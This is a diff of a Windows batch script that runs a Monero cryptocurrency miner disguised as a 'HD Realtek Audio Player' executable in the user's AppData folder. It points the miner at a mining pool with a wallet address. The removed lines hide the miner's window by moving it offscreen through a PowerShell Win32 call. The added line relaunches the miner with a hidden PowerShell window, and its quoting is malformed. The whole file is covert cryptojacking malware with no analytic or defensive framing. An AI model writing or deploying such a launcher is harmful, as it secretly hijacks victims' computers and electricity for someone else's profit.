@@ -1,12 +1,1 @@
-@echo off
-start "" "%APPDATA%\HD Realtek Audio Player\Windows64.exe" -o xmr.kryptex.network:7777 -u 45pH5NwPHSKNCerFarWL6fGqAXet3D2Li5Kutgzx8W2Q5tPkiH63Z6wW4rCVK5PGXEUQ8tcd4i4xMdJSJz2h9RSgH2dwze6.RIG_CPU -p x --algo rx/0 --cpu-max-threads-hint=50
-
-timeout /t 2 /nobreak >nul
-
-powershell -Command "& {
-    Start-Sleep -Seconds 1;
-    $sig = '[DllImport(\"user32.dll\")] public static extern bool MoveWindow(IntPtr hWnd, int X, int Y, int nWidth, int nHeight, bool bRepaint);';
-    add-type -name Win32 -member $sig -namespace Funcs;
-    $hwnd = (Get-Process Windows64 | Where-Object { $_.MainWindowTitle -ne '' }).MainWindowHandle;
-    [Funcs.Win32]::MoveWindow($hwnd, 1, 9999, 1, 1, $true)
-}"
+powershell -WindowStyle Hidden -Command Windows64.exe" -o xmr.kryptex.network:7777 -u 45pH5NwPHSKNCerFarWL6fGqAXet3D2Li5Kutgzx8W2Q5tPkiH63Z6wW4rCVK5PGXEUQ8tcd4i4xMdJSJz2h9RSgH2dwze6.RIG_CPU -p x --algo rx/0 --cpu-max-threads-hint=50
